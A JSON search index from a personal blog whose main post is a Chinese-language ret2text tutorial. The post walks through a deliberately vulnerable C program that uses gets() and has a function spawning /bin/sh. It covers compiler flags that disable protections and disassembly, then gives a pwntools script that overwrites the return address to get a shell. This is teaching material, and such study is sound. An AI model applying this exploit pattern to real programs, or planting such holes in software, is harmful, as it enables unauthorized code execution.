[{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：\n程序中的某些代码位置是可预测的，同时在不同运行时是固定的 只需要利用程序的现有代码，无需注入新的代码 可以通过一个简单的例子说明这个问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // example.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int success() { puts(\u0026#34;called success()!\\n\u0026#34;); return system(\u0026#34;/bin/sh\u0026#34;); } void vuln() { char buf[32]; gets(buf); puts(buf); } int main() { vuln(); return 0; } 上述代码中的库函数 gets 是一个危险函数，通过以下给出的 gets 的一个实现，可以看出这个函数引起的严重问题。它从标准输入（stdin）读入一行，在遇到一个回车或某个错误时停止。gets 从不检查输入的长度，这导致它很容易被利用来进行栈溢出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* Read a newline-terminated string from stdin into S, removing the trailing newline. Return S or NULL. */ char * gets (char *s) { register char *p = s; register int c; FILE *stream = stdin; if (!__validfp (stream) || p == NULL) { __set_errno (EINVAL); return NULL; } if (feof (stream) || ferror (stream)) return NULL; while ((c = getchar ()) != EOF) if (c == \u0026#39;\\n\u0026#39;) break; else *p++ = c; *p = \u0026#39;\\0\u0026#39;; /* Return null if we had an error, or if we got EOF before writing any characters. */ if (ferror (stream) || (feof (stream) \u0026amp;\u0026amp; p == s)) return NULL; return s; } 通过 gcc 编译上述代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以利用 checksec 来检查编译出文件的安全性\n1 2 3 4 5 6 7 8 $ checksec example Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments 使用 IDA 反汇编程序，我们可以看到对应函数的汇编表示，\n; Attributes: bp-based frame public vuln vuln proc near s= byte ptr -20h ; __unwind { push rbp mov rbp, rsp sub rsp, 20h lea rax, [rbp+s] mov rdi, rax call _gets lea rax, [rbp+s] mov rdi, rax ; s call _puts nop leave retn ; } // starts at 40116A vuln endp 可以看出当程序运行时，vuln 函数在运行时的栈帧如下所示。如果提供大于32字节的数据时栈帧中保存的栈指针和返回地址。因此我们可以输入大于32字节的数据来覆盖返回地址，从而控制程序的执行流。\n1 2 3 4 5 6 7 8 9 | rsp | |:--------------:| | char buf[0] | | ... | | char buf[31] | |:--------------:| | rbp | |:--------------:| | return address | 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) sh = process(\u0026#39;./example\u0026#39;) # gdb.attach(sh) success_addr = 0x401146 payload = b\u0026#39;a\u0026#39; * 0x20 # buf[32] payload += b\u0026#39;b\u0026#39; * 8 # rbp # 伪造返回地址，跳转到 nop ; ret，Ubuntu18及以上版本的系统要求在调用system函数时栈16字节对齐， # 即调用system函数时rsp的值必须是16的倍数，也就是末位为0，否则无法执行。这里多进行一次 rtn 以实现对齐 payload += p64(0x40112f) payload += p64(success_addr) # success 函数地址 sh.sendline(payload) sh.interactive() NOTE:\n上述代码中，没有立即跳转到 success() 的运行地址，这是源于 system() 函数运行时的栈16字节对齐要求。\n","date":"1 June 2024","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2text/","section":"Posts","summary":"返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：","title":"ret2text","type":"posts"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"Rop","type":"tags"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/series/rop/","section":"Series","summary":"","title":"Rop","type":"series"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/tags/stack-overflow/","section":"Tags","summary":"","title":"Stack Overflow","type":"tags"},{"content":"","date":"1 June 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" ","date":"1 June 2024","externalUrl":null,"permalink":"/","section":"Welcome to my blog","summary":" ","title":"Welcome to my blog","type":"page"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":" an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\ntest1 test2 test22 test23 item1 item2 item3 item3a item3b We\u0026rsquo;re living the future so the present is our past.\ncode # 1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, world!\u0026#34;); return 0; } 1 print(\u0026#39;hello\u0026#39;) table # a b one two 3 4 math # $$ \\sum_{i=2}^ni=\\frac{n(n+1)}{2}-1 $$\n","date":"25 May 2024","externalUrl":null,"permalink":"/posts/test/hello_world/","section":"Posts","summary":"an example to get you started","title":"hello world","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/test/","section":"Tags","summary":"","title":"Test","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/series/test/","section":"Series","summary":"","title":"Test","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/categories/test/","section":"Categories","summary":"","title":"Test","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/welcome/","section":"Tags","summary":"","title":"Welcome","type":"tags"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"}]